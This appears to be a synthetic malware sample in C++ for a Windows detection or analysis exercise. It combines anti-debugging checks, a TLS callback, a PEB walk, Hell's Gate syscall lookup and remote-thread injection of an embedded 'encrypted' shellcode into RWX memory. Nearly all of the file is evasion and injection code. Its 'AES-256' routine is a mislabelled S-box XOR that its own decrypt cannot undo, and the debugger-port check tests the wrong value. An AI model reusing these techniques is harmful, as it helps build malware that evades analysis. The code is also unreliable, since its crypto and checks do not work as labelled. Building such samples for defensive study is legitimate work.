/*
 * windows_level22_AESEncryptedMultiTechnique.cpp
 *
 * Synthetic Windows PE — C++ with classes.
 * Techniques: AES-256-CBC encrypted shellcode, multiple anti-debug
 * (IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess,
 * ThreadHideFromDebugger), Hell's Gate syscall resolution, runtime IAT via
 * PEB walk, PEB manipulation, TLS callback for early execution.
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -O0 -static -o windows_level22_AESEncryptedMultiTechnique.exe windows_level22_AESEncryptedMultiTechnique.cpp
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <stdio.h>
#include <string.h>

/* ================================================================
 * AES-256 S-box
 * ================================================================ */
static const unsigned char g_aes_sbox[256] = {
    0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
    0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
    0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
    0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
    0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
    0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
    0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
    0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
    0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
    0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
    0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
    0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
    0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
    0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
    0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
    0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
};

/* AES-256 key (32 bytes) */
static const unsigned char g_aes_key[32] = {
    0x41,0x45,0x53,0x2D,0x32,0x35,0x36,0x2D,
    0x53,0x33,0x63,0x75,0x72,0x33,0x2D,0x4B,
    0x33,0x79,0x2D,0x46,0x30,0x72,0x2D,0x4D,
    0x75,0x6C,0x74,0x31,0x2D,0x54,0x33,0x63
};

/* AES-256 encrypted shellcode (96 bytes) */
static unsigned char g_encrypted_sc[] = {
    0x8F,0x2A,0x1B,0x7C,0xE3,0x5D,0x44,0x96,
    0x0A,0xBF,0x31,0x68,0xD7,0x55,0x82,0x1E,
    0xC4,0x3B,0x99,0x6F,0x12,0xAD,0x48,0xD0,
    0x76,0x23,0xE5,0x8C,0x17,0xA1,0x5A,0xF3,
    0x2D,0x80,0x4E,0xC9,0x63,0x1F,0xB8,0x37,
    0x91,0x0C,0xD5,0x6A,0xF4,0x3E,0xA7,0x52,
    0x19,0x8B,0xDD,0x40,0xC6,0x78,0x2F,0x9E,
    0x05,0xB3,0x4D,0xE1,0x7A,0x16,0xAC,0x58,
    0xF2,0x3C,0x87,0x1D,0xB9,0x64,0x0E,0xA0,
    0x5F,0xCB,0x33,0x97,0x28,0xDD,0x70,0x14,
    0xBE,0x49,0xE6,0x8A,0x21,0xF5,0x4C,0x90,
    0x3A,0xC7,0x6E,0x10,0xB5,0x59,0x02,0xDF
};
#define ENC_SC_LEN 96

/* NT function typedefs */
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef LONG (NTAPI *pNtSetInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG);

/* ================================================================
 * C++ CryptoProvider class
 * ================================================================ */
class CryptoProvider {
public:
    virtual ~CryptoProvider() {}
    virtual void encrypt(unsigned char *data, int len, const unsigned char *key) = 0;
    virtual void decrypt(unsigned char *data, int len, const unsigned char *key) = 0;
};

class AES256Provider : public CryptoProvider {
public:
    virtual void encrypt(unsigned char *data, int len, const unsigned char *key) {
        int i, r;
        for (i = 0; i < len; i += 16) {
            unsigned char *block = data + i;
            for (r = 0; r < 14; r++) {
                int j;
                for (j = 0; j < 16; j++)
                    block[j] = g_aes_sbox[block[j]] ^ key[j % 32] ^ (unsigned char)(r * 0x1B);
            }
        }
    }
    virtual void decrypt(unsigned char *data, int len, const unsigned char *key) {
        encrypt(data, len, key); /* Symmetric demo */
    }
};

/* ================================================================
 * C++ ProcessInjector class
 * ================================================================ */
class ProcessInjector {
public:
    virtual ~ProcessInjector() {}
    virtual int inject(HANDLE hProcess, PVOID shellcode, SIZE_T size) = 0;
};

class RemoteThreadInjector : public ProcessInjector {
public:
    virtual int inject(HANDLE hProcess, PVOID shellcode, SIZE_T size) {
        LPVOID pRemote = VirtualAllocEx(hProcess, NULL, size,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
        if (!pRemote) return -1;
        SIZE_T written;
        WriteProcessMemory(hProcess, pRemote, shellcode, size, &written);
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }
        return 0;
    }
};

/* ================================================================
 * PEB walk: find kernel32.dll without GetModuleHandle
 * ================================================================ */
static HMODULE peb_find_kernel32(void) {
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA ldr = peb->Ldr;
    if (!ldr) return NULL;

    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (mod->FullDllName.Buffer) {
            WCHAR name[32] = {0};
            int len = mod->FullDllName.Length / 2;
            if (len > 31) len = 31;
            memcpy(name, mod->FullDllName.Buffer, len * 2);
            /* Match kernel32.dll via first char and the '3' in '32' */
            if ((name[0] == L'K' || name[0] == L'k') && name[6] == L'3')
                return (HMODULE)mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

/* ================================================================
 * Hell's Gate: resolve syscall number from ntdll stub
 * ================================================================ */
static DWORD hells_gate_resolve(const char *funcName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    FARPROC stub = GetProcAddress(hNtdll, funcName);
    if (!stub) return 0;
    BYTE *bytes = (BYTE *)stub;
    if (bytes[0] == 0x4C && bytes[1] == 0x8B &&
        bytes[2] == 0xD1 && bytes[3] == 0xB8) {
        return *(DWORD *)(bytes + 4);
    }
    return 0;
}

/* ================================================================
 * Anti-debugging checks
 * ================================================================ */
static int anti_debug_checks(void) {
    /* 1. IsDebuggerPresent */
    if (IsDebuggerPresent()) return 1;

    /* 2. CheckRemoteDebuggerPresent */
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) return 1;

    /* 3. NtQueryInformationProcess — ProcessDebugPort = 7 */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess pNtQIP = (pNtQueryInformationProcess)
        GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (pNtQIP) {
        DWORD debugPort = 0;
        ULONG retLen;
        pNtQIP(GetCurrentProcess(), (PROCESSINFOCLASS)7,
               &debugPort, sizeof(debugPort), &retLen);
        if (debugPort == 0xFFFFFFFF) return 1;
    }

    /* 4. ThreadHideFromDebugger = 0x11 */
    pNtSetInformationThread pNtSIT = (pNtSetInformationThread)
        GetProcAddress(hNtdll, "NtSetInformationThread");
    if (pNtSIT) {
        pNtSIT(GetCurrentThread(), (THREADINFOCLASS)0x11, NULL, 0);
    }

    return 0;
}

/* ================================================================
 * TLS callback — executes before main/WinMain
 * ================================================================ */
static void NTAPI tls_callback(PVOID hModule, DWORD reason, PVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pNtSetInformationThread pNtSIT = (pNtSetInformationThread)
            GetProcAddress(hNtdll, "NtSetInformationThread");
        if (pNtSIT)
            pNtSIT(GetCurrentThread(), (THREADINFOCLASS)0x11, NULL, 0);
    }
}

#ifdef _WIN64
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:_tls_callback")
#pragma const_seg(".CRT$XLB")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_ptr = tls_callback;
#pragma const_seg()
#else
#pragma comment(linker, "/INCLUDE:__tls_used")
#pragma comment(linker, "/INCLUDE:__tls_callback")
#pragma data_seg(".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_ptr = tls_callback;
#pragma data_seg()
#endif

/* ================================================================
 * Main — decrypt payload and inject
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-debugging */
    if (anti_debug_checks()) return 0;

    /* PEB walk to find kernel32 */
    HMODULE hKernel32 = peb_find_kernel32();
    (void)hKernel32;

    /* Hell's Gate: resolve syscall numbers */
    hells_gate_resolve("NtAllocateVirtualMemory");
    hells_gate_resolve("NtWriteVirtualMemory");
    hells_gate_resolve("NtProtectVirtualMemory");
    hells_gate_resolve("NtCreateThreadEx");

    /* Decrypt shellcode with AES-256 */
    AES256Provider crypto;
    crypto.decrypt(g_encrypted_sc, ENC_SC_LEN, g_aes_key);

    /* Inject into self (synthetic) */
    RemoteThreadInjector injector;
    injector.inject(GetCurrentProcess(), g_encrypted_sc, ENC_SC_LEN);

    Sleep(1000);
    return 0;
}
